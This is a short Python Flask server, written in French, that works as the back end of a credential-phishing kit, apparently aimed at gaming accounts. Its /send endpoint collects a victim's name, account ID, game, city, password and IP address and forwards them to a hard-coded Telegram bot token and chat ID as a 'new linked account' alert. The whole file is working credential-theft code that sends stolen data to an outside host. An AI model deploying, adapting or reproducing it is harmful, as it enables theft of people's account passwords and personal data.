from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import datetime

app = Flask(__name__)
CORS(app)

TOKEN = "6979576051:AAGB_RAKRKORo-3jkv13XRHWhandRY240fc"
CHAT_ID = "6537215671"

@app.route('/send', methods=['POST'])
def send_to_telegram():
    try:
        data = request.json
        user_ip = request.remote_addr # Capture l'IP
        now = datetime.datetime.now().strftime("%H:%M:%S")
        
        message = (
            f"🎯 --- NOUVEAU COMPTE LIÉ --- 🎯\n"
            f"⏰ Heure: {now}\n"
            f"👤 Nom: {data.get('nom')}\n"
            f"🆔 ID: {data.get('id')}\n"
            f"🎮 Jeu: {data.get('jeu')}\n"
            f"📍 Ville: {data.get('ville')}\n"
            f"🌐 IP: {user_ip}\n"
            f"🔑 PASS: {data.get('pass')}\n"
            f"----------------------------"
        )
        
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                      json={"chat_id": CHAT_ID, "text": message})
        
        return jsonify({"status": "success"}), 200
    except Exception as e:
        print(f"Erreur: {e}")
        return jsonify({"status": "error"}), 500

if __name__ == '__main__':
    print("🚀 SERVEUR DE SYNCHRONISATION PRÊT SUR LE PORT 5000")
    app.run(host='0.0.0.0', port=5000)
